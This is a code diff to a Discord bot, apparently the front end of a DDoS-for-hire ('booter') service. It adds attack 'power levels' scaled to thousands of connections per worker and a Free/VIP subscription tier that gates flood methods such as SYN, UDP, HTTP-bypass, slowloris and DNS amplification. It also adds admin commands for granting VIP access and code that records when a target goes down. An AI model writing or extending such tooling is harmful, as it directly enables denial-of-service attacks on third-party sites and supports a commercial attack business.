@@ -163,13 +163,16 @@ const DURATION_OPTIONS = [
   { value: "600",  label: "10 minutes",   description: "Maximum duration" },
 ];
 
-// ── Thread presets ───────────────────────────────────────────────────────────
+// ── Thread presets (power levels 1–8; internally ×500 connections in prod) ───
 const THREAD_OPTIONS = [
-  { value: "50",   label: "50 threads",   description: "Low — test only" },
-  { value: "100",  label: "100 threads",  description: "Medium" },
-  { value: "200",  label: "200 threads",  description: "High (default)" },
-  { value: "500",  label: "500 threads",  description: "Very High" },
-  { value: "1000", label: "1000 threads", description: "Maximum" },
+  { value: "1", label: "⚪ Power 1 — Mínimo",      description: "~500 conns — teste básico" },
+  { value: "2", label: "🟢 Power 2 — Baixo",       description: "~1.000 conns" },
+  { value: "3", label: "🟢 Power 3 — Médio-Baixo", description: "~1.500 conns" },
+  { value: "4", label: "🟡 Power 4 — Médio",       description: "~2.000 conns (padrão)" },
+  { value: "5", label: "🟡 Power 5 — Médio-Alto",  description: "~2.500 conns" },
+  { value: "6", label: "🟠 Power 6 — Alto",        description: "~3.000 conns" },
+  { value: "7", label: "🔴 Power 7 — Muito Alto",  description: "~3.500 conns" },
+  { value: "8", label: "💀 Power 8 — MÁXIMO",      description: "~4.000 conns por worker" },
 ];
 
 // ── Pending launcher sessions (userId → { target, duration, threads }) ───────
@@ -180,6 +183,16 @@ const sessionTimers    = new Map<string, NodeJS.Timeout>();
 // ── Attack cooldown — 30s between /attack start per user ──────────────────
 const ATTACK_COOLDOWN_MS = 30_000;
 const attackCooldowns = new Map<string, number>(); // userId → lastLaunchTimestamp
+
+// ── VIP / Free tier limits ────────────────────────────────────────────────
+const FREE_METHODS = new Set([
+  "http-flood", "http-bypass", "slowloris", "syn-flood",
+  "udp-flood", "tcp-flood", "dns-amp",
+]);
+const MAX_POWER_FREE    = 4;   // power level 1-4 for free
+const MAX_POWER_VIP     = 8;
+const MAX_DURATION_FREE = 60;  // seconds
+const MAX_DURATION_VIP  = 600;
 
 // ── WhatsApp report/sendcode cooldowns ────────────────────────────────────
 const WA_REPORT_COOLDOWN_MS   = 3 * 60 * 1000; // 3 minutos
@@ -309,7 +322,7 @@ const COMMANDS = [
           opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
         )
         .addIntegerOption(opt =>
-          opt.setName("threads").setDescription("Base thread count per node (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
+          opt.setName("threads").setDescription("Power level 1-8 (padrão: 4 = ~2000 conns)").setRequired(false).setMinValue(1).setMaxValue(8)
         )
     ),
 
@@ -323,7 +336,7 @@ const COMMANDS = [
       opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
     )
     .addIntegerOption(opt =>
-      opt.setName("threads").setDescription("Base thread count (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
+      opt.setName("threads").setDescription("Power level 1-8 (padrão: 4 = ~2000 conns)").setRequired(false).setMinValue(1).setMaxValue(8)
     ),
 
   new SlashCommandBuilder()
@@ -409,7 +422,7 @@ const COMMANDS = [
           opt.setName("duration").setDescription("Duração em segundos (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
         )
         .addIntegerOption(opt =>
-          opt.setName("threads").setDescription("Threads (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
+          opt.setName("threads").setDescription("Power level 1-8 (padrão: 4 = ~2000 conns)").setRequired(false).setMinValue(1).setMaxValue(8)
         )
     )
     .addSubcommand(sub =>
@@ -441,6 +454,35 @@ const COMMANDS = [
     )
     .addSubcommand(sub =>
       sub.setName("refresh").setDescription("🔄 Forçar re-harvest de proxies agora (22 fontes)")
+    ),
+
+  // ── /vip ──────────────────────────────────────────────────────────────────
+  new SlashCommandBuilder()
+    .setName("vip")
+    .setDescription("👑 Gestão de planos VIP — status, grant e revoke")
+    .addSubcommand(sub =>
+      sub.setName("status")
+        .setDescription("📋 Ver seu plano atual (Free/VIP) e limites")
+        .addUserOption(opt =>
+          opt.setName("user").setDescription("Usuário a consultar (admin only)").setRequired(false)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("grant")
+        .setDescription("⭐ Conceder VIP a um usuário (owner only)")
+        .addUserOption(opt =>
+          opt.setName("user").setDescription("Usuário a receber VIP").setRequired(true)
+        )
+        .addIntegerOption(opt =>
+          opt.setName("days").setDescription("Dias de duração (0 = permanente)").setRequired(false).setMinValue(0).setMaxValue(3650)
+        )
+    )
+    .addSubcommand(sub =>
+      sub.setName("revoke")
+        .setDescription("✖ Revogar VIP de um usuário (owner only)")
+        .addUserOption(opt =>
+          opt.setName("user").setDescription("Usuário a ter VIP revogado").setRequired(true)
+        )
     ),
 
   // ── /stats ────────────────────────────────────────────────────────────────
@@ -1329,6 +1371,8 @@ function startMonitor(attackId: number, initialEditFn: MonitorEditFn, target: st
       );
       if (userId && botClient && !downAlertSent.get(attackId) && isDefinitivelyDown) {
         downAlertSent.set(attackId, true);
+        // Persist efficacy data to DB in background (non-blocking)
+        void api.markTargetDown(attackId);
         try {
           const user = await botClient.users.fetch(userId);
           await user.send({
@@ -1449,9 +1493,10 @@ function buildLauncherEmbed(target: string, session: LaunchSession, selectedMeth
     ? `**${mInfo.label}** selecionado — ajuste duração & threads, depois clique **🚀 LAUNCH**`
     : "Selecione um **método de ataque**, ajuste duração & threads se quiser.\nClique **🚀 LAUNCH** quando pronto.";
 
+  const powerLabel = `⚡ Power **${session.threads}**/8`;
   const configValue = mInfo
-    ? `\`${target}\` · ${mInfo.emoji ?? "⚡"} **${mInfo.label}** · ⏱ **${session.duration}s** · 🧵 **${session.threads}t**`
-    : `\`${target}\` · ⚔️ _método não selecionado_ · ⏱ **${session.duration}s** · 🧵 **${session.threads}t**`;
+    ? `\`${target}\` · ${mInfo.emoji ?? "⚡"} **${mInfo.label}** · ⏱ **${session.duration}s** · ${powerLabel}`
+    : `\`${target}\` · ⚔️ _método não selecionado_ · ⏱ **${session.duration}s** · ${powerLabel}`;
 
   const embed = new EmbedBuilder()
     .setColor(mInfo ? COLORS.CRIMSON : COLORS.GOLD)
@@ -1509,7 +1554,7 @@ async function handleAttackStart(interaction: ChatInputCommandInteraction): Prom
   attackCooldowns.set(userId, Date.now());
 
   // Init session with defaults — auto-expires in 5 minutes if abandoned
-  const session: LaunchSession = { target, duration: 60, threads: 200 };
+  const session: LaunchSession = { target, duration: 60, threads: 4 };
   pendingSessions.set(userId, session);
   scheduleSessionExpiry(userId);
 
@@ -1925,7 +1970,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
   if (sub === "broadcast") {
     const target   = interaction.options.getString("target", true);
     const duration = interaction.options.getInteger("duration") ?? 60;
-    const threads  = interaction.options.getInteger("threads")  ?? 200;
+    const threads  = interaction.options.getInteger("threads") ?? 4;
     const isHttps  = /^https:/i.test(target);
     const port     = isHttps ? 443 : 80;
 
@@ -2000,7 +2045,7 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
   await interaction.deferReply();
   const target   = interaction.options.getString("target", true);
   const duration = interaction.options.getInteger("duration") ?? 60;
-  const threads  = interaction.options.getInteger("threads")  ?? 200;
+  const threads  = interaction.options.getInteger("threads") ?? 4;
   const isHttps  = /^https:/i.test(target);
   const port     = isHttps ? 443 : 80;
   console.log(`[GEASS] ${interaction.user.tag} → ${target} | ${threads}t | ${duration}s`);
@@ -2131,6 +2176,41 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
       await interaction.reply({ content: "❌ Session expired. Run `/attack start` again.", flags: MessageFlags.Ephemeral });
       return;
     }
+
+    // ── Tier validation (owners bypass) ─────────────────────────────────
+    const isPrivileged = isOwner(userId, interaction.user.username) || isMod(userId, interaction.user.username);
+    if (!isPrivileged) {
+      const tierData = await api.getUserTier(userId);
+      const isVip    = tierData.tier === "vip" && (!tierData.expiresAt || new Date(tierData.expiresAt) > new Date());
+      const maxPower = isVip ? MAX_POWER_VIP    : MAX_POWER_FREE;
+      const maxDur   = isVip ? MAX_DURATION_VIP : MAX_DURATION_FREE;
+
+      const violations: string[] = [];
+      if (!isVip && !FREE_METHODS.has(method)) {
+        violations.push(`❌ **${method}** é exclusivo VIP\nMétodos free: ${[...FREE_METHODS].join(", ")}`);
+      }
+      if (session.threads > maxPower) {
+        violations.push(`❌ Power **${session.threads}** excede limite ${isVip ? "VIP" : "Free"} (**${maxPower}**)`);
+      }
+      if (session.duration > maxDur) {
+        violations.push(`❌ Duração **${session.duration}s** excede limite ${isVip ? "VIP" : "Free"} (**${maxDur}s**)`);
+      }
+
+      if (violations.length > 0) {
+        await interaction.reply({
+          embeds: [
+            new EmbedBuilder()
+              .setColor(COLORS.RED)
+              .setTitle(isVip ? "⚠️ Limite VIP Excedido" : "🔒 Recurso VIP Necessário")
+              .setDescription(violations.join("\n\n") + (isVip ? "" : "\n\n*Use `/vip status` para ver seus limites ou contate um admin para upgrade.*"))
+              .setFooter({ text: AUTHOR }),
+          ],
+          flags: MessageFlags.Ephemeral,
+        });
+        return;
+      }
+    }
+
     clearSession(userId);
 
     await interaction.deferUpdate();
@@ -2151,7 +2231,6 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
       ]);
       const row     = buildAttackButtons(attack.id, true);
       await interaction.editReply({ embeds: [buildStartEmbed(attack, pStats?.count ?? 0)], components: [row], files: buildAttackFiles() });
-      const userId  = interaction.user.id;
       console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
       startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId, interaction.channelId);
     } catch (err: unknown) {
@@ -2448,7 +2527,7 @@ async function handleSchedule(interaction: ChatInputCommandInteraction): Promise
   const when       = interaction.options.getString("when", true);
   const method     = interaction.options.getString("method")    ?? "geass-override";
   const duration   = interaction.options.getInteger("duration") ?? 60;
-  const threads    = interaction.options.getInteger("threads")  ?? 200;
+  const threads    = interaction.options.getInteger("threads") ?? 4;
   const fireDate   = new Date(when);
   if (isNaN(fireDate.getTime()) || fireDate <= new Date()) {
     await interaction.reply({ flags: MessageFlags.Ephemeral, embeds: [buildErrorEmbed("INVALID TIME",
@@ -2566,6 +2645,106 @@ async function handleProxy(interaction: ChatInputCommandInteraction): Promise<vo
     await interaction.editReply({ embeds: [embed] });
   } catch (e: unknown) {
     await interaction.editReply({ embeds: [buildErrorEmbed("PROXY STATS FAILED", String(e))] });
+  }
+}
+
+// ── /vip handler ──────────────────────────────────────────────────────────────
+async function handleVip(interaction: ChatInputCommandInteraction): Promise<void> {
+  const sub      = interaction.options.getSubcommand();
+  const callerId = interaction.user.id;
+  const callerName = interaction.user.username;
+
+  // ── /vip status ────────────────────────────────────────────────────────
+  if (sub === "status") {
+    const targetUser = interaction.options.getUser("user");
+    // Only owners/mods can check other users
+    if (targetUser && targetUser.id !== callerId) {
+      if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
+        await interaction.reply({ content: "❌ Somente admins podem ver o plano de outros usuários.", flags: MessageFlags.Ephemeral });
+        return;
+      }
+    }
+    const checkId   = targetUser?.id ?? callerId;
+    const checkName = targetUser?.username ?? interaction.user.username;
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+    const tierData = await api.getUserTier(checkId);
+    const isVip    = tierData.tier === "vip" && (!tierData.expiresAt || new Date(tierData.expiresAt) > new Date());
+    const expiryStr = tierData.expiresAt
+      ? `<t:${Math.floor(new Date(tierData.expiresAt).getTime() / 1000)}:R>`
+      : "♾️ Permanente";
+
+    const embed = new EmbedBuilder()
+      .setColor(isVip ? COLORS.GOLD : COLORS.GRAY)
+      .setTitle(isVip ? "👑 Plano VIP Ativo" : "🔓 Plano Free")
+      .setDescription(isVip
+        ? `> *"Aos aliados de Lelouch, as melhores armas são concedidas."*\n\n**${checkName}** tem acesso VIP.`
+        : `> *"Poder básico ainda é poder. Mas os grandes generais merecem mais."*\n\n**${checkName}** está no plano Free.`
+      )
+      .addFields(
+        { name: "📊 Power Máximo",  value: isVip ? `**${MAX_POWER_VIP}**/8` : `**${MAX_POWER_FREE}**/8`,   inline: true },
+        { name: "⏱ Duração Máx.",  value: isVip ? `**${MAX_DURATION_VIP}s**` : `**${MAX_DURATION_FREE}s**`, inline: true },
+        { name: "📡 Métodos",       value: isVip ? "**Todos**" : `**${FREE_METHODS.size}** métodos free`,   inline: true },
+        ...(isVip ? [{ name: "⏰ Expira", value: expiryStr, inline: false }] : []),
+      )
+      .setFooter({ text: isVip ? AUTHOR : `${AUTHOR} • Contate um admin para upgrade VIP` })
+      .setTimestamp();
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // ── /vip grant — owner only ─────────────────────────────────────────────
+  if (sub === "grant") {
+    if (!isOwner(callerId, callerName)) {
+      await interaction.reply({ content: "❌ Apenas owners podem conceder VIP.", flags: MessageFlags.Ephemeral });
+      return;
+    }
+    const target = interaction.options.getUser("user", true);
+    const days   = interaction.options.getInteger("days") ?? 0;
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+    try {
+      const result = await api.grantVip(target.id, callerId, days > 0 ? days : undefined);
+      const expStr = result.expiresAt
+        ? `<t:${Math.floor(new Date(result.expiresAt).getTime() / 1000)}:R>`
+        : "♾️ Permanente";
+      await interaction.editReply({
+        embeds: [
+          new EmbedBuilder()
+            .setColor(COLORS.GOLD)
+            .setTitle("👑 VIP Concedido")
+            .setDescription(`**${target.username}** agora tem acesso VIP${days > 0 ? ` por **${days}** dias` : " permanente"}.`)
+            .addFields({ name: "⏰ Expira", value: expStr, inline: true })
+            .setFooter({ text: AUTHOR }).setTimestamp(),
+        ],
+      });
+    } catch (e) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("VIP GRANT FAILED", String(e))] });
+    }
+    return;
+  }
+
+  // ── /vip revoke — owner only ────────────────────────────────────────────
+  if (sub === "revoke") {
+    if (!isOwner(callerId, callerName)) {
+      await interaction.reply({ content: "❌ Apenas owners podem revogar VIP.", flags: MessageFlags.Ephemeral });
+      return;
+    }
+    const target = interaction.options.getUser("user", true);
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+    try {
+      await api.revokeVip(target.id);
+      await interaction.editReply({
+        embeds: [
+          new EmbedBuilder()
+            .setColor(COLORS.GRAY)
+            .setTitle("✖ VIP Revogado")
+            .setDescription(`**${target.username}** foi rebaixado para o plano Free.`)
+            .setFooter({ text: AUTHOR }).setTimestamp(),
+        ],
+      });
+    } catch (e) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("VIP REVOKE FAILED", String(e))] });
+    }
+    return;
   }
 }
 
@@ -6736,6 +6915,8 @@ async function main(): Promise<void> {
         await handleAdvisor(interaction);
       } else if (commandName === "proxy") {
         await handleProxy(interaction);
+      } else if (commandName === "vip") {
+        await handleVip(interaction);
       } else if (commandName === "stats") {
         await handleStats(interaction);
       } else if (commandName === "admin") {
